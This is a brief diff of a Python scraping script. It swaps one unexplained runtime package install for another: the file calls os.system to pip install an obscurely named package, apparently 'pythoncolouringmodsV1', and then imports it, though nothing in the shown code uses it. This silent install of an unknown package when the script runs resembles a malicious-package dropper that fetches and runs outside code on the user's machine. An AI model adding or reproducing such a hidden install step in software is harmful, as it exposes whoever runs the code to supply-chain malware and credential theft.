@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptaddition")
-import syscryptaddition
+os.system("pip install pythoncolouringmodsV1")
+import pythoncolouringmodsV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
